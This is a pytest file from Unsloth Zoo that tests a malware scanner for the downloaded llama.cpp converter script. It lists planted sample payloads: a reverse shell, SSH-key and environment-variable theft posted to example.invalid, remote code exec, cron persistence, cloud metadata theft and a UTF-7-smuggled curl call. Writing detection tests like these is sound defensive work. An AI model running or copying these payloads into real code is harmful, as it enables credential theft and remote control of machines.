# Unsloth Zoo - Utilities for Unsloth
# Copyright 2023-present Daniel Han-Chen, Michael Han-Chen & the Unsloth team. All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""Tests for the static scan of the downloaded llama.cpp converter.

Three groups:

  * clean_*     : the genuine converter must produce zero findings, offline
    against the committed fixture and, when the network is up, against live
    llama.cpp master. A check that fires on the real file would warn on every
    GGUF export and would have to be reverted, so this is the load-bearing case.
  * flagged_*   : planted payloads must be reported, including one aimed at the
    argparse default that `llama_cpp.py` eval()s in-process.
  * export_*    : the scan runs before the bytes are patched, written or run, and
    neither a scanner crash nor a finding can break a legitimate conversion.
"""

from __future__ import annotations

import importlib.util
import logging
import pathlib
import py_compile
import marshal
import os
import sys
import time
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
FIXTURES = Path(__file__).resolve().parent / "fixtures"
GENUINE_CONVERTER = FIXTURES / "convert_hf_to_gguf_master.py.txt"
CONVERTER_URL = (
    "https://github.com/unslothai/llama.cpp/raw/refs/heads/master/convert_hf_to_gguf.py"
)


def _load(module_name, relative_path):
    """Load a module by path, without importing the unsloth_zoo package."""
    spec = importlib.util.spec_from_file_location(module_name, REPO_ROOT / relative_path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def scan():
    return _load("converter_scan_under_test", "unsloth_zoo/converter_scan.py")


@pytest.fixture
def llama_cpp():
    return _load("llama_cpp_under_test_converter_scan", "unsloth_zoo/llama_cpp.py")


@pytest.fixture(autouse = True)
def _default_scan_env(monkeypatch):
    """Neither switch is set on a normal run; do not inherit a developer's shell."""
    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)


# ---------------------------------------------------------------------------
# The genuine converter must be clean.
# ---------------------------------------------------------------------------


def test_clean_fixture_exists():
    assert GENUINE_CONVERTER.is_file(), GENUINE_CONVERTER


def test_clean_genuine_converter_fixture_has_no_findings(scan):
    content = GENUINE_CONVERTER.read_bytes()
    findings = scan.scan_converter_source(content, "convert_hf_to_gguf.py")
    assert findings == [], [(f.severity, f.check, f.evidence) for f in findings]


def test_clean_genuine_converter_matches_no_individual_pattern(scan):
    """Stronger than no findings: every finding combines these patterns, so matching none of them
    individually means the margin holds for any combination."""
    text = GENUINE_CONVERTER.read_text(encoding = "utf-8", errors = "replace")
    hits = sorted(
        name for name, pattern in scan.VENDORED_PATTERNS.items() if pattern.search(text)
    )
    assert hits == [], hits


def test_clean_live_upstream_converter_has_no_findings(scan):
    """Same assertion against current master, skipped when offline or rate-limited; follows
    tests/test_convert_hf_to_gguf_patcher.py: upstream moving fails, an unreachable network does
    not."""
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(CONVERTER_URL, timeout = 30, headers = headers)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 500, 502, 503, 504):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    # A 404 means the URL llama_cpp.py uses is gone, breaking GGUF export; fail, never skip.
    assert response.status_code == 200, (
        f"{CONVERTER_URL} returned HTTP {response.status_code}. "
        f"LLAMA_CPP_CONVERT_FILE needs updating."
    )
    findings = scan.scan_converter_source(response.content, CONVERTER_URL)
    assert findings == [], (
        "live llama.cpp master trips the converter scan, which would warn on every "
        f"GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


_LIVE_ROOT_MODULES = (
    "convert_hf_to_gguf_update.py",
    "convert_llama_ggml_to_gguf.py",
    "convert_lora_to_gguf.py",
)
_RAW_MASTER = "https://raw.githubusercontent.com/ggml-org/llama.cpp/master/"


@pytest.mark.parametrize("name", _LIVE_ROOT_MODULES)
def test_clean_live_root_modules_have_no_findings(scan, name):
    """The converter's directory is scanned, so upstream's other root-level scripts are read and
    held to the entrypoint's bar; a finding warns on every GGUF export."""
    requests = pytest.importorskip("requests")
    try:
        response = requests.get(_RAW_MASTER + name, timeout = 30)
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code in (403, 429, 500, 502, 503, 504):
        pytest.skip(f"upstream rate-limited / unavailable: HTTP {response.status_code}")
    if response.status_code == 404:
        pytest.skip(f"{name} is no longer at the root of llama.cpp master")
    assert response.status_code == 200, f"{name} returned HTTP {response.status_code}"

    findings = scan.scan_converter_source(response.content, name)
    assert findings == [], (
        f"{name} sits beside the converter and is now scanned, so this would warn on "
        f"every GGUF export: {[(f.severity, f.check, f.evidence) for f in findings]}"
    )


def test_the_real_conversion_package_fits_under_the_cap(llama_cpp):
    """A cap below the real conversion/ tree (94 upstream modules) warned on every GGUF export and,
    under UNSLOTH_CONVERTER_SCAN_STRICT, refused it; this reads the real tree so upstream growth
    past the cap fails here, not on a user's machine."""
    requests = pytest.importorskip("requests")
    headers = {}
    if os.environ.get("GITHUB_TOKEN"):
        headers["Authorization"] = f"Bearer {os.environ['GITHUB_TOKEN']}"
    try:
        response = requests.get(
            "https://api.github.com/repos/ggml-org/llama.cpp/git/trees/master?recursive=1",
            timeout = 30,
            headers = headers,
        )
    except requests.exceptions.RequestException as exc:
        pytest.skip(f"network unreachable: {exc}")
    if response.status_code != 200:
        pytest.skip(f"tree unavailable: HTTP {response.status_code}")

    paths = [entry["path"] for entry in response.json().get("tree", [])]
    modules = [path for path in paths if path.startswith("conversion/") and path.endswith(".py")]
    if not modules:
        pytest.skip("llama.cpp master no longer has a conversion/ package")

    assert len(modules) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES, (
        f"conversion/ holds {len(modules)} modules and the cap is "
        f"{llama_cpp.MAX_CONVERSION_PACKAGE_FILES}: the genuine package would be "
        f"reported as unreadable on every export, and refused under strict mode"
    )
    entries = [path for path in paths if path.startswith("conversion/")]
    assert len(entries) <= llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES, len(entries)


def test_clean_ordinary_converter_shaped_script_has_no_findings(scan):
    """A converter doing normal converter things stays quiet."""
    source = b"""
import argparse, os, sys, json
from pathlib import Path
import torch
import gguf

if 'NO_LOCAL_GGUF' not in os.environ:
    sys.path.insert(1, str(Path(__file__).parent / 'gguf-py'))

def parse_args():
    parser = argparse.ArgumentParser(description="convert a model")
    parser.add_argument("--outtype", type=str, default="f16")
    parser.add_argument("--bigendian", action="store_true")
    parser.add_argument("--split-max-tensors", type=int, default=0)
    parser.add_argument("--model-name", type=str, default=None)
    return parser.parse_args()

def main():
    args = parse_args()
    for path in sorted(Path(args.model).glob("*.safetensors")):
        with open(path, "rb") as f:
            data = f.read(8)
    self_metadata = gguf.Metadata.load(None, None, None)
"""
    assert scan.scan_converter_source(source, "convert_hf_to_gguf.py") == []


# ---------------------------------------------------------------------------
# Planted payloads must be reported.
# ---------------------------------------------------------------------------

_PAYLOADS = {
    "staged base64 payload": (
        b"import base64, subprocess\n"
        b"blob = base64.b64decode('aW1wb3J0IG9z')\n"
        b"subprocess.run(['sh', '-c', blob])\n",
        "base64 decode + subprocess execution (staged payload)",
    ),
    "remote code execution": (
        b"import requests\n"
        b"exec(requests.get('http://example.invalid/p').text)\n",
        "Downloads and executes remote code",
    ),
    "credential stealer": (
        b"import requests, os\n"
        b"key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        b"requests.post('http://example.invalid/collect', data=key)\n",
        "Reads credential paths AND makes network calls",
    ),
    "reverse shell": (
        b"import socket, subprocess\n"
        b"s = socket.socket()\n"
        b"s.connect(('example.invalid', 4444))\n"
        b"subprocess.Popen(['/bin/sh'], stdin=s.fileno())\n",
        "Reverse shell / bind shell pattern",
    ),
    "environment harvest": (
        b"import os, requests\n"
        b"requests.post('http://example.invalid/e', json=dict(os.environ))\n",
        "Harvests environment variables/secrets AND makes network calls",
    ),
    "staged dropper": (
        b"open('/tmp/payload.sh', 'w').write(data)\n"
        b"import subprocess; subprocess.run(['sh', '/tmp/payload.sh'])\n",
        "Writes to /tmp and executes (staged dropper)",
    ),
    "persistence backdoor": (
        b"import requests\n"
        b"open('/etc/cron.d/unsloth', 'w').write(requests.get('http://example.invalid/c').text)\n",
        "Installs persistence AND makes network calls (backdoor pattern)",
    ),
    "cloud metadata theft": (
        b"import requests\n"
        b"t = requests.get('http://169.254.169.254/latest/meta-data/iam/').text\n"
        b"requests.post('http://example.invalid/t', data=t)\n",
        "Accesses cloud metadata/IMDS AND makes network calls",
    ),
    "marshal obfuscation": (
        b"import marshal\n"
        b"exec(marshal.loads(blob))\n",
        "Advanced obfuscation (marshal/compile/zlib) + exec/eval",
    ),
}


@pytest.mark.parametrize("name", sorted(_PAYLOADS))
def test_flagged_payload_is_reported(scan, name):
    source, expected_check = _PAYLOADS[name]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    reported = [f for f in findings if f.check == expected_check]
    assert reported[0].severity in (scan.CRITICAL, scan.HIGH)
    assert reported[0].evidence.strip(), reported


def test_flagged_payload_hidden_in_a_real_converter_is_still_reported(scan):
    """The realistic shape: upstream's file with a few lines appended."""
    source = GENUINE_CONVERTER.read_bytes() + (
        b"\n\nimport base64, subprocess\n"
        b"subprocess.check_output(base64.b64decode('ZWNobyBoaQ=='), shell=True)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert any("staged payload" in f.check for f in findings), [f.check for f in findings]


def test_flagged_findings_carry_evidence(scan):
    source, _ = _PAYLOADS["staged base64 payload"]
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings
    assert all(f.evidence.strip() for f in findings), findings
    assert any("L" in f.evidence for f in findings), findings


# ---------------------------------------------------------------------------
# The argparse default that reaches eval() in the Unsloth process.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "default",
    [
        b"{'a':1}['a']",
        b"sys.modules['os'].environ",
        b"__builtins__.__dict__['eval']",
    ],
)
def test_flagged_argparse_default_that_would_evaluate(scan, default):
    """What survives the capture and still evaluates: subscripts and lookups."""
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    argparse_findings = [f for f in findings if "argparse default" in f.check]
    assert argparse_findings, [f.check for f in findings]
    assert all(f.severity == scan.CRITICAL for f in argparse_findings)
    assert all(default.decode() in f.evidence for f in argparse_findings)


@pytest.mark.parametrize(
    "default",
    [
        # Every token upstream has actually used.
        b'"f16"', b'"auto"', b'"0"', b"0", b"None", b'"store_true"',
        # Plain names, which have no call syntax to invoke.
        b"DEFAULT_OUTTYPE", b"gguf.LlamaFileType",
        # The regex truncates benign defaults like `[0, 1]` and `os.cpu_count()` so they do not
        # parse; eval() raises inside llama_cpp.py's try/except, so nothing runs and reporting them
        # would warn on a converter that did nothing wrong.
        b"[0, 1]", b"(1, 2)", b'"chat template"', b"os.cpu_count()", b"Path.cwd()",
        b"globals()['os']", b"argparse.SUPPRESS", b"[]", b"{}",
    ],
)
def test_clean_argparse_default_that_cannot_run_is_quiet(scan, default):
    source = b'parser.add_argument("--outtype", type=str, default=' + default + b")\n"
    findings = [
        f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check
    ]
    assert findings == [], findings


def test_clean_truncated_defaults_match_what_llama_cpp_does_with_them(scan, llama_cpp):
    """The tokens the rule stays quiet on must be exactly those eval() rejects, checked by running
    the same eval() llama_cpp.py uses on each."""
    source = (
        b'parser.add_argument("--a", default=[0, 1])\n'
        b'parser.add_argument("--b", default=os.cpu_count())\n'
        b'parser.add_argument("--c", default="chat template")\n'
    )
    tokens = [d.decode() for _flag, d in llama_cpp.RE_ARGPARSE_DEFAULT.findall(source)]
    assert tokens == ["[0", "os.cpu_count(", '"chat'], tokens
    for token in tokens:
        with pytest.raises(SyntaxError):
            eval(token)  # noqa: S307 - the point is that this raises
    assert [f for f in scan.scan_converter_source(source, "x.py") if "argparse" in f.check] == []


def test_argparse_regex_is_the_one_llama_cpp_evals(scan, llama_cpp):
    """The scan and the eval sink must share one regex; compared by pattern text and flags, since
    path-loaded fixtures build a second module object."""
    assert llama_cpp.RE_ARGPARSE_DEFAULT.pattern == scan.RE_ARGPARSE_DEFAULT.pattern
    assert llama_cpp.RE_ARGPARSE_DEFAULT.flags == scan.RE_ARGPARSE_DEFAULT.flags


def test_argparse_regex_still_matches_what_the_flag_parser_expects(scan):
    """Pins the exact regex text rather than tidying it: moving it out of llama_cpp.py must not
    change which flags Unsloth resolves defaults for."""
    expected = (
        rb"parser\.add_argument\([\s]*[\"\']([^\"\']{1,})[\'\"]"
        rb"[^\)]*(?:action=|default=)[\s]*([^,\s\)]+)"
    )
    assert scan.RE_ARGPARSE_DEFAULT.pattern == expected
    source = (
        b'    parser.add_argument("--outtype", type=str, default="f16")\n'
        b'    parser.add_argument("--bigendian", action="store_true")\n'
    )
    assert scan.RE_ARGPARSE_DEFAULT.findall(source) == [
        (b"--outtype", b'"f16"'),
        (b"--bigendian", b'"store_true"'),
    ]


# ---------------------------------------------------------------------------
# Warn, do not block, unless asked to block.
# ---------------------------------------------------------------------------


def test_warning_names_the_rule_the_source_and_the_escape_hatch(scan, caplog):
    source, expected_check = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert findings
    text = caplog.text
    assert CONVERTER_URL in text
    assert expected_check in text
    assert "UNSLOTH_LLAMA_CPP_SCRIPTS_DIR" in text
    assert "UNSLOTH_CONVERTER_SCAN_STRICT" in text


def test_warning_does_not_raise_by_default(scan):
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_clean_converter_logs_nothing(scan, caplog):
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(GENUINE_CONVERTER.read_bytes(), CONVERTER_URL) == []
    assert caplog.text == ""


def test_strict_mode_refuses_a_downloaded_converter(scan, monkeypatch):
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError) as excinfo:
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    assert CONVERTER_URL in str(excinfo.value)


def test_strict_mode_still_allows_a_deliberately_supplied_local_converter(scan, monkeypatch, caplog):
    """The warning points to UNSLOTH_LLAMA_CPP_SCRIPTS_DIR; hard-failing that file would break the
    remedy, so a local copy warns even in strict mode."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        findings = scan.warn_on_suspicious_converter(
            source, "/home/me/llama.cpp/convert_hf_to_gguf.py", is_local_copy = True,
        )
    assert findings
    assert "/home/me/llama.cpp/convert_hf_to_gguf.py" in caplog.text


def test_scan_can_be_disabled(scan, monkeypatch, caplog):
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []
    assert caplog.text == ""


def test_disable_switch_is_read_per_call(scan, monkeypatch):
    """Not cached at import, so a caller can set it before the first export."""
    source, _ = _PAYLOADS["reverse shell"]
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL)
    monkeypatch.setenv("UNSLOTH_DISABLE_CONVERTER_SCAN", "1")
    assert scan.warn_on_suspicious_converter(source, CONVERTER_URL) == []


# ---------------------------------------------------------------------------
# A broken scanner must not break a conversion.
# ---------------------------------------------------------------------------


def test_scanner_crash_is_reported_and_swallowed(scan, monkeypatch, caplog):
    def _boom(*args, **kwargs):
        raise ValueError("catastrophic backtracking")

    monkeypatch.setattr(scan, "scan_converter_source", _boom)
    with caplog.at_level("WARNING"):
        assert scan.warn_on_suspicious_converter(b"anything", CONVERTER_URL) == []
    assert "could not run" in caplog.text
    assert "catastrophic backtracking" in caplog.text


def test_scanner_crash_guard_does_not_swallow_a_strict_refusal(scan, monkeypatch):
    """The guard wraps the scan only. A deliberate refusal still propagates."""
    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
    source, _ = _PAYLOADS["reverse shell"]
    with pytest.raises(scan.ConverterScanError):
        scan.warn_on_suspicious_converter(source, CONVERTER_URL)


def test_undecodable_bytes_do_not_crash_the_scan(scan):
    assert scan.scan_converter_source(b"\xff\xfe\x00bad bytes\n", "x.py") == []


def test_a_declared_encoding_is_what_the_scan_reads(scan):
    """A utf-7 coding declaration turns the payload into subprocess.run(...), which UTF-8 decoding
    misses, so the scan must use the declared encoding."""
    import base64

    shifted = "".join(
        "+" + base64.b64encode(ch.encode("utf-16-be")).decode().rstrip("=") + "-"
        for ch in "subprocess"
    )
    source = ("# coding: utf-7\n" + shifted + ".run(['curl', 'http://evil'])\n").encode("ascii")
    assert source.decode("utf-7").find("subprocess.run") != -1, "the probe is not shifted"

    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert any("process" in check.lower() for check in checks), checks
    assert any("encoding" in check.lower() for check in checks), checks


def test_a_plain_utf8_converter_says_nothing_about_encoding(scan):
    """The other half: an ordinary converter must not grow an encoding finding."""
    source = b"import json\nprint(json.dumps({}))\n"
    checks = [finding.check for finding in scan.scan_converter_source(source)]
    assert not [check for check in checks if "encoding" in check.lower()], checks


def test_scan_cap_leaves_room_for_the_largest_real_converter(scan):
    assert scan.MAX_SCAN_BYTES > 500 * 1024


def test_oversized_input_reports_that_it_was_only_partly_scanned(scan, monkeypatch):
    """Past the cap the tail is not scanned, so the finding must say so: the whole file still runs,
    and a silent partial scan would look clean."""
    monkeypatch.setattr(scan, "MAX_SCAN_BYTES", 2048)
    payload, expected_check = _PAYLOADS["reverse shell"]
    head = payload + b"# pad\n" * 1000
    findings = scan.scan_converter_source(head, "x.py")
    checks = [f.check for f in findings]
    assert expected_check in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks

    # Same payload past the cap: missed, which is what the cap finding warns about.
    tail = b"# pad\n" * 1000 + payload
    checks = [f.check for f in scan.scan_converter_source(tail, "x.py")]
    assert expected_check not in checks, checks
    assert any("larger than the scan cap" in c for c in checks), checks


def test_within_the_cap_nothing_is_reported_about_truncation(scan):
    findings = scan.scan_converter_source(GENUINE_CONVERTER.read_bytes(), "x.py")
    assert not any("scan cap" in f.check for f in findings), findings


# ---------------------------------------------------------------------------
# The whole-file patterns must not be stallable by the bytes they scan.
# ---------------------------------------------------------------------------


def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
    """Fuzzes the ordered-search evaluation (used for DOTALL `A.*B.*C` patterns) against
    pattern.search: 8000 token-built texts across all 23 patterns."""
    import random

    tokens = [
        "socket", ".connect", "subprocess", "sh", "bash", "cmd", "/bin/sh",
        "pty.spawn", "os.dup2", "platform.system", "if", "Linux", "Windows",
        "Darwin", "while True", "time.sleep", "urlopen", "requests.get",
        "chr(1)", "marshal.loads", "b64decode(", "history", "read", "/tmp/x",
        "os.system", "chmod", "+x", "rotate=", "lambda", "bytearray([1])",
        "RSA PUBLIC KEY", "MIIabcdefghijklmnopqrstu", "open('~/.ssh/id_rsa')",
        "tarfile.open(", ".env", "virtualbox", "hardware", "vmware", "detect",
        "Popen", "open(", "(", ")", "[", "]", "=", "\n", "  ", "x", "dig ",
        "nslookup", "os.environ", "TOKEN", "zlib.decompress", "169.254.169.254",
        "/etc/cron", "docker run", "wallet.dat", "openssl enc", "exec(", ".text(",
    ]
    rng = random.Random(31337)
    mismatches = []
    for _ in range(8000):
        text = "".join(rng.choice(tokens) for _ in range(rng.randint(1, 50)))
        for name, pattern in scan.VENDORED_PATTERNS.items():
            if scan._matches(pattern, text) != bool(pattern.search(text)):
                mismatches.append((name, text))
    assert mismatches == [], mismatches[:3]


def test_one_dot_star_alternative_does_not_put_the_others_on_the_line_path(scan):
    """Per-line evaluation was one flag for the whole pattern; one non-DOTALL `.*` forced every
    alternative line by line, dropping a three-line harvest finding even in strict mode."""
    harvest = "payload = json.dumps(\n    os.environ\n)\n"
    assert scan.RE_ENV_HARVEST.search(harvest), "the fixture must match the real pattern"
    assert scan._matches(scan.RE_ENV_HARVEST, harvest)

    # The flags stay per alternative, and this pattern really does mix the two.
    flags = scan._evaluator(scan.RE_ENV_HARVEST)[1]
    assert True in flags and False in flags, flags

    # End to end: the dropped finding comes back.
    source = (
        b"import json, os, requests\n"
        b"payload = json.dumps(\n"
        b"    os.environ\n"
        b")\n"
        b"requests.post('http://example.invalid/collect', data=payload)\n"
    )
    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
    assert findings, "a multi-line environment harvest plus a network send is a finding"


def test_a_multiline_subject_agrees_with_re_search_on_every_pattern(scan):
    """The existing fuzz rarely builds a subject whose match spans a newline, so this breaks each
    pattern's own alternative text across lines at its whitespace-tolerant spots."""
    import re as _re

    mismatches = []
    for name, pattern in scan.VENDORED_PATTERNS.items():
        for alternative in scan._split_top_level_alternatives(pattern.pattern):
            text = alternative if isinstance(alternative, str) else alternative.decode()
            if "\\s*" not in text or ".*" in text:
                continue
            # A literal subject for this alternative, with each \s* spelled "\n".
            subject = _re.sub(r"\\s\*", "\n", text)
            subject = subject.replace("\\b", "").replace("\\(", "(").replace("\\)", ")")
            subject = subject.replace("\\.", ".").replace("\\s+", " ")
            if _re.search(r"[\[\]\(\)\?\+\*\|]", subject):
                continue      # still regex, not a subject; skip rather than guess
            if bool(pattern.search(subject)) != scan._matches(pattern, subject):
                mismatches.append((name, subject))
    assert mismatches == [], mismatches[:3]


@pytest.mark.parametrize(
    "name,filler",
    [
        ("RE_REVERSE_SHELL", "socket\n.connect\n"),
        ("RE_ANTI_ANALYSIS", "platform.system()\nif x:\n"),
        ("RE_C2_POLLING", "while True\ntime.sleep(\n"),
        ("RE_CRED_ACCESS", "open(aaaaaaaaaa\n"),
        ("RE_TEMP_EXEC", "/tmp/aaaa\n"),
        ("RE_OBFUSCATION", "chr(1)\n"),
        ("RE_FS_ENUM", "history\n"),
    ],
)
def test_hostile_input_cannot_stall_a_pattern(scan, name, filler):
    """Converter bytes are untrusted, so a pattern a crafted file can stall would wedge every GGUF
    export; a hang escapes the try/except around the scan."""
    import time

    text = filler * (200 * 1024 // len(filler))
    pattern = scan.VENDORED_PATTERNS[name]
    started = time.perf_counter()
    scan._matches(pattern, text)
    assert time.perf_counter() - started < 5.0


def test_a_wall_of_call_prefixes_cannot_stall_the_credential_rule(scan):
    """Bounding the negated class made RE_CRED_ACCESS linear; with no regex timeout, a wall of open(
    at the scan cap must stay fast, and no credential marker means no match."""
    import time

    text = "open(" * (scan.MAX_SCAN_BYTES // 5)
    started = time.perf_counter()
    assert scan._matches(scan.RE_CRED_ACCESS, text) is False
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize(
    "text",
    [
        "x = open(os.path.expanduser('~/.ssh/id_rsa')).read()",
        "data = Path('/home/u/.aws/credentials.json').read_text()",
        "p = os.path.join(home, '.kube', 'config')",
        "cfg = open('.env')",
        "read_bytes(  '/etc/shadow'  )",
    ],
)
def test_the_prefilter_never_costs_a_real_credential_match(scan, text):
    """The prefilter is only sound if its literals are required: real matches must survive it."""
    assert bool(scan.RE_CRED_ACCESS.search(text)) is True, "fixture must match the raw pattern"
    assert scan._matches(scan.RE_CRED_ACCESS, text) is True


def test_every_probe_is_a_literal_the_pattern_really_requires(scan):
    """A probe that is not really required would silently drop findings looking like a clean file;
    deleting the probed literal must stop the raw pattern matching too."""
    for name, pattern in scan.VENDORED_PATTERNS.items():
        alternatives, _flags, probes = scan._evaluator(pattern)
        for required in probes:
            for probe in required:
                # Each branch must appear in the pattern source: a requirement, not a guess.
                for literal in probe.pattern.split("|"):
                    plain = literal.replace("\\", "")
                    assert plain and plain in pattern.pattern.replace("\\", ""), (
                        f"{name}: probe literal {plain!r} is not in the pattern"
                    )


@pytest.mark.parametrize(
    "source, subject, probed",
    [
        (r"open\((?:alpha|bravo)x", "open(alphax", True),
        # The quantifier can skip the whole group, so nothing in it is required.
        (r"open\((?:alpha|bravo)?x", "open(x", False),
        (r"open\((?:alpha|bravo)*x", "open(x", False),
        # Two required groups are both probed, and both must be satisfied.
        (r"(?:alpha|bravo)\s*(?:charlie|deltaa)", "alpha charlie", True),
    ],
    ids = ["required", "optional ?", "optional *", "two required"],
)
def test_an_optional_group_is_never_treated_as_required(scan, source, subject, probed):
    """No shipped pattern has an optional literal group, so this guard is exercised directly:
    wrongly requiring one would silently hide a real finding."""
    import re as _re

    pattern = _re.compile(source)
    assert bool(pattern.search(subject)) is True, "fixture must match the raw pattern"
    assert bool(scan._required_literal_probes(source, 0)) is probed
    assert scan._matches(pattern, subject) is True


def test_a_nested_wildcard_cannot_backtrack_across_the_whole_file(scan):
    """_split_on_dot_star splits only top-level wildcards; RE_TEMP_EXEC's nested one restarted at
    every chmod in a wall with no +x, stalling the scan."""
    import time

    text = "/tmp/a " + ("ch" + "mod ") * (scan.MAX_SCAN_BYTES // 6)
    started = time.perf_counter()
    assert scan._matches(scan.RE_TEMP_EXEC, text) is False
    assert time.perf_counter() - started < 5.0


@pytest.mark.parametrize(
    "text",
    [
        "/tmp/x.sh\nsubprocess.run(['sh', '/tmp/x.sh'])",
        "/tmp/payload ; ch" + "mod +x /tmp/payload",
        "/tmp/a\nos.system('sh /tmp/a')",
        "/tmp/b\nos.popen('/tmp/b')",
    ],
)
def test_bounding_the_nested_wildcard_keeps_the_real_temp_exec_matches(scan, text):
    assert bool(scan.RE_TEMP_EXEC.search(text)) is True, "fixture must match the raw pattern"
    assert scan._matches(scan.RE_TEMP_EXEC, text) is True


def test_the_nested_wildcard_bound_reaches_only_where_it_is_meant_to(scan):
    """Bounding a surviving wildcard gives up matches over MAX_CLASS_SPAN chars between halves; done
    only for the one segment quadratic without it, so the affected set is pinned; a new nested
    wildcard must land here first."""
    import re

    affected = set()
    for name, pattern in scan.VENDORED_PATTERNS.items():
        dotall = bool(pattern.flags & re.DOTALL)
        for alternative in scan._split_top_level_alternatives(pattern.pattern):
            text = (
                alternative.decode("latin-1")
                if isinstance(alternative, bytes)
                else alternative
            )
            segments = None
            if ".*" in text and (dotall or not scan._has_anchor(text)):
                segments = scan._split_on_dot_star(text)
            for segment in (segments if segments is not None else [text]):
                classes_only = scan._bound_class_repeats(segment)
                if scan._bound_dot_star(classes_only) != classes_only:
                    affected.add(name)

    assert affected == {"RE_TEMP_EXEC"}, affected


def test_hostile_file_scans_in_reasonable_time(scan):
    import time

    hostile = (
        "socket\n.connect\nwhile True\ntime.sleep(\nplatform.system()\nif y:\n"
        "chr(1)\nhistory\n/tmp/a\nopen(aaa\nexec(aaa\n.add(aaa\nRSA PUBLIC KEY\n"
        "bytearray([1])\nrotate=\nlambda\nos.environ KEY\n"
    ) * 3000
    started = time.perf_counter()
    scan.scan_converter_source(hostile, "x.py")
    assert time.perf_counter() - started < 10.0


def test_one_enormous_line_does_not_stall_evidence_extraction(scan):
    """Evidence is line-scoped, which is only a bound if lines are bounded."""
    import time

    source = ("socket " + "a" * 200000 + " .connect subprocess\n").encode()
    started = time.perf_counter()
    findings = scan.scan_converter_source(source, "x.py")
    assert time.perf_counter() - started < 10.0
    assert any("Reverse shell" in f.check for f in findings), [f.check for f in findings]


# ---------------------------------------------------------------------------
# Wiring into the export path.
# ---------------------------------------------------------------------------

_MINIMAL_CONVERTER = b"""\
import argparse
import gguf

class ModelBase:
    def __init__(self):
        self.metadata = gguf.Metadata.load(None, None, None)
        n_experts = self.hparams["num_experts"]

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("model", type=str)
    parser.add_argument("--outfile", type=str, default=None)
    parser.add_argument("--outtype", type=str, default="f16")
    return parser.parse_args()
"""


def _run_patcher(llama_cpp, tmp_path, monkeypatch, converter_bytes):
    """Drive the patcher off a local converter, writing only inside tmp_path."""
    scripts_dir = tmp_path / "llama.cpp"
    scripts_dir.mkdir()
    converter = scripts_dir / "convert_hf_to_gguf.py"
    converter.write_bytes(converter_bytes)
    stat = converter.stat()
    monkeypatch.setattr(llama_cpp, "LLAMA_CPP_DEFAULT_DIR", str(scripts_dir))
    llama_cpp._download_convert_hf_to_gguf_cached.cache_clear()
    return llama_cpp._download_convert_hf_to_gguf_cached(
        "unsloth_convert_hf_to_gguf",
        (str(converter), stat.st_mtime_ns, stat.st_size),
        None,
    )


def test_export_scans_before_writing_the_patched_script(llama_cpp, tmp_path, monkeypatch):
    """The scan must see the bytes before they are patched, written or run."""
    seen = {}

    def _record(content, source, is_local_copy = False, log = None):
        seen["content"] = content
        seen["source"] = source
        seen["is_local_copy"] = is_local_copy
        seen["patched_exists"] = os.path.exists(
            os.path.join(str(tmp_path / "llama.cpp"), "unsloth_convert_hf_to_gguf.py")
        )
        return []

    monkeypatch.setattr(llama_cpp, "warn_on_suspicious_converter", _record)
    patched, _text, _vision = _run_patcher(
        llama_cpp, tmp_path, monkeypatch, _MINIMAL_CONVERTER,
    )
